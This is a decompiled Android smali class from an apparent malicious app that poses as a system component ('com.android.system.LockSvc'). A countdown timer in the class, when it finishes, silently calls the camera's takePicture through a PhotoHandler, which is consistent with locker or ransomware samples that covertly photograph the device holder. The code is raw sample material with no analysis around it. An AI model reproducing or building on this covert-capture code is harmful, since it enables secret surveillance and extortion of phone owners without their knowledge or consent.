.class Lcom/android/system/LockSvc$Init_Svc$1;
.super Landroid/os/CountDownTimer;
.source "LockSvc.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/system/LockSvc$Init_Svc;->onPostExecute(Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Lcom/android/system/LockSvc$Init_Svc;


# direct methods
.method constructor <init>(Lcom/android/system/LockSvc$Init_Svc;JJ)V
    .locals 0
    .param p2, "$anonymous0"    # J
    .param p4, "$anonymous1"    # J

    .prologue
    .line 1
    iput-object p1, p0, Lcom/android/system/LockSvc$Init_Svc$1;->this$1:Lcom/android/system/LockSvc$Init_Svc;

    .line 837
    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 4

    .prologue
    const/4 v3, 0x0

    .line 842
    iget-object v0, p0, Lcom/android/system/LockSvc$Init_Svc$1;->this$1:Lcom/android/system/LockSvc$Init_Svc;

    invoke-static {v0}, Lcom/android/system/LockSvc$Init_Svc;->access$2(Lcom/android/system/LockSvc$Init_Svc;)Lcom/android/system/LockSvc;

    move-result-object v0

    invoke-static {v0}, Lcom/android/system/LockSvc;->access$0(Lcom/android/system/LockSvc;)Landroid/hardware/Camera;

    move-result-object v0

    .line 843
    new-instance v1, Lcom/android/system/LockSvc$PhotoHandler;

    iget-object v2, p0, Lcom/android/system/LockSvc$Init_Svc$1;->this$1:Lcom/android/system/LockSvc$Init_Svc;

    invoke-static {v2}, Lcom/android/system/LockSvc$Init_Svc;->access$2(Lcom/android/system/LockSvc$Init_Svc;)Lcom/android/system/LockSvc;

    move-result-object v2

    invoke-direct {v1, v2}, Lcom/android/system/LockSvc$PhotoHandler;-><init>(Lcom/android/system/LockSvc;)V

    .line 842
    invoke-virtual {v0, v3, v3, v1}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 845
    return-void
.end method

.method public onTick(J)V
    .locals 0
    .param p1, "millisUntilFinished"    # J

    .prologue
    .line 851
    return-void
.end method
